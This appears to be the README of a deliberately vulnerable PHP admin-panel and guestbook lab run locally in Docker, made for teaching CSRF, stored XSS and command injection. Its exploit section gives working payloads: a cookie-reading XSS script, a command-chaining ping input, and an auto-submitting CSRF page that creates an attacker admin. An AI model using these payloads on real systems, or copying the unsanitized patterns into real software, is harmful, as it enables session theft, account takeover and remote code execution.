# Project 2: CSRF, XSS & Command Injection

This project is a simple PHP "Admin Panel & Guestbook" application running on an Apache server with a MariaDB database. It is designed to demonstrate three common and critical web application vulnerabilities.

### Vulnerabilities Included:

1.  **CSRF + Privilege Escalation (CVE-2024-23831 style):** The form to create new admin users lacks anti-CSRF tokens, allowing an attacker to trick a logged-in admin into creating a new, malicious admin account.
2.  **Stored XSS (CVE-2023-1119-1 style):** The guestbook does not sanitize user comments, allowing an attacker to inject persistent JavaScript payloads that execute in the browsers of other users.
3.  **Command Injection (Generic):** A network utility page executes shell commands with unsanitized user input, enabling remote code execution.

---

### Infrastructure Details

See the `cloud.json` file in this directory for details on the fake cloud deployment environment.

---

### How to Run

**Prerequisites:**
*   Docker
*   Docker Compose

**Instructions:**

1.  Navigate to the `project2` directory in your terminal.
2.  Run the following command to build and start the application and database:

    ```bash
    docker-compose up --build -d
    ```

3.  The vulnerable web application will be available at **http://localhost:5002**.

---

### How to Exploit

#### Step 1: Login as Admin
First, navigate to **http://localhost:5002/login.php** and log in with the credentials:
*   **Username:** `admin`
*   **Password:** `password`

You will be redirected to the `admin.php` panel. Keep this browser tab open.

#### Exploit 1: Stored XSS

1.  Go to the guestbook page: **http://localhost:5002/guestbook.php**.
2.  In the comment form, enter the following payload:
    ```html
    <script>alert('Your admin session cookie is: ' + document.cookie);</script>
    ```
3.  Submit the comment.
4.  Now, go back to the **Admin Panel** tab (or refresh it): **http://localhost:5002/admin.php**.
5.  **Result:** The malicious script will execute in the context of the admin's session, and an alert box will pop up displaying the admin's session cookie.

#### Exploit 2: Command Injection

1.  Navigate to the network tool: **http://localhost:5002/network.php**.
2.  In the input box, enter the following payload to chain a command:
    ```
    127.0.0.1; whoami
    ```
3.  Click "Ping".
4.  **Result:** The server will execute both the `ping` command and the `whoami` command. The output will show the ping results followed by `www-data`, which is the user running the web server process.

#### Exploit 3: CSRF + Privilege Escalation

This attack requires tricking the logged-in admin into visiting a malicious page.

1.  **Ensure you are still logged into the admin panel in your browser.**
2.  Create a new HTML file on your local machine named `csrf_attack.html` with the following content. This simulates the attacker's malicious website.

    ```html
    <html>
      <body>
        <h1 style="color:red;">YOU HAVE BEEN HACKED!</h1>
        <p>This page silently creates a new admin user on the vulnerable site.</p>
        <form id="csrf-form" action="http://localhost:5002/admin.php" method="POST" style="display:none;">
          <input type="hidden" name="new_user" value="attacker" />
          <input type="hidden" name="new_pass" value="hacked123" />
        </form>
        <script>
          document.getElementById("csrf-form").submit();
        </script>
      </body>
    </html>
    ```
3.  Open `csrf_attack.html` in the same browser where you are logged in as admin.
4.  The page will automatically submit the hidden form to the vulnerable application. Your browser, having the admin's session cookie, will authenticate this request.
5.  **Result:** Go back to the application and try to log in with username `attacker` and password `hacked123`. You now have administrator access. The attack succeeded.

### To Stop and Clean Up

Run the following command in the `project2` directory:

```bash
docker-compose down
```